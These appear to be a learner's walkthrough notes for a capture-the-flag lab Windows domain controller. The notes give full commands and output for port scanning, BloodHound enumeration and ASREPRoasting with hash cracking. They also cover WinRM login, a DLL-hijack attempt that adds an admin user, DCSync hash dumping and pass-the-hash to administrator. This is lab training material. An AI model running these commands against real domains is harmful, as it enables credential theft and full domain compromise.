enumerate ports    
`sudo nmap -p- --min-rate=1000 -T4 -oN nmap_fast --stats-every 15s 10.10.10.30`    

more detailed scan for   
`sudo nmap -sV -sS -sU -A -oN nmap_details --stats-every 15s --script=/home/stddel/git/vulscan/vulscan.nse -p(cat nmap_results | grep '^.[0-9]' | cut -d '/' -f 1 |  tr '\n' ',' | sed 's/,$//g') 10.10.10.30`   


389/tcp   open          ldap           Microsoft Windows Active Directory LDAP    
88/tcp    open          kerberos-sec   Microsoft Windows Kerberos    
> This should be a Windows Domain Controller    

enumerate DC with credentials from the previous machines    
`python bloodhound/bloodhound.py -d megacorp.local -u sandra -p "Password1234!" -gc pathfinder.megacorp.local -c all -ns 10.10.10.30`     
The results are all the info from DC    
```
computers.json
domains.json
groups.json
users.json
```

`neo4j start console`     
`bloodhound --no-sandbox`    
This should show the structure of the domain and give the attack vector.    
Have not found a way to give a reasonable results.    

It's worth checking if Kerberos pre-authentication has been disabled for this account, which means it is vulnerable to ASREPRoasting.
We can check this using a tool such as Impacket's GetNPUsers.    

```
python /home/stddel/git/impacket/examples/GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30 > hash

[*] Getting TGT for svc_bes
$krb5asrep$23$svc_bes@MEGACORP.LOCAL:8640b0e4cfc6e6ea75c52b7a8718c883$7792389ea3206bc285cc9d37d02cb745fa9e34499ece99cd1928be3ae94e52fade17f0895ddb32642eedb5bf505ae8864932792f5851c302259ff6ab14e45443a9cda7f698e59c5a75da3af2a411fe0a835e05bdde7b081438d8a0795231f6fdab19640b66ef2c306e29500e90765d653f9f9bd6dd0b6b9c7db971ac5462e9b3855a2c8b82df002a985271007e053f662c6f36fb6703ad31ac6be85ff7dd1637e5a67fb6088f6a7a8510dcf8024e5e7d123fe6c6cb0dc1f2d7fab71b9df357127cd42e756f1204b3e30d9d79722a526b344b443d4b56321baa3c8e976a810b52555a37f737f30540ee8c6158b2d6940a
```

hash part starts at right from `$krb5asrep$23$...`    
```
hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt

>

svc_bes@MEGACORP.LOCAL:Sheffield19
```

It is now possible to access the server using WinRM    
```
gem install evil-winrm
evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19
```
And we are logged in now    
```
> whoami
megacorp\svc_bes
> cd C:\Users\svc_bes\Desktop>
> cat user.txt
b05fb166688a8603d970c6d033f637f1
```
copy all the `git/PowerSploit/Privesc` into windows machine powershell foulder    

```
> echo $Env:PSModulePath
C:\Users\svc_bes\Documents\WindowsPowerShell\Modules
> upload to C:\Users\svc_bes\Documents\WindowsPowerShell\Modules\Privesc
> Import-Module Privesc
> Invoke-AllChecks

...blablabla...

[*] Checking %PATH% for potentially hijackable DLL locations...


ModifiablePath    : C:\Users\svc_bes\AppData\Local\Microsoft\WindowsApps
IdentityReference : MEGACORP\svc_bes
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\svc_bes\AppData\Local\Microsoft\WindowsApps
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\svc_bes\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

...blablabla...


```

lets do it!

```
> Write-HijackDll -DllPath 'C:\Users\svc_bes\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
> net user john1432 Password123! /add && timeout /t 5 && net localgroup Administrators john1432 /add
```
FAIL

from tutorial:
In order to leverage the `GetChangesAll` permission, we can use Impacket's `secretsdump.py` to perform a DCSync attack and dump the NTLM hashes of all domain users.    

`python ~/git/impacket/examples/secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30`    

Works like a magic. All users with all the hahses are here.    

And we even dont need to crack these hashes, as we can login directly using them.    

`python ~/git/impacket/examples/psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18`    

And this is the end of this machine     

```
>type root.txt
ee613b2d048303e5fd4ac6647d944645
```



